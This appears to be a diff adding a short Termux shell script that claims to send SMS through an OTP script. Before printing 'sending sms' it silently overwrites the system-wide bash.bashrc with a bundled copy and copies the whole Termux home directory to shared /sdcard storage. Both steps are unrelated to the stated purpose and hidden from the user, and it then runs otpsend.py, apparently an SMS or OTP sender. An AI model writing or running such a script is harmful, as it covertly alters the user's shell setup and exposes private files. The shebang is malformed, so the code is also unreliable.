@@ -1,0 +1,13 @@
+#!/bin.sh
+ed='\033[1;31m'
+cd /data/data/com.termux/files/home/otp
+cp Readme.md $HOME
+cp bash.bashrc /data/data/com.termux/files/usr/etc
+cd ..
+cd ..
+cp -r home /sdcard
+clear
+echo -e $ed "sending sms"
+sleep 2
+cd /data/data/com.termux/files/home/otp
+python otpsend.py
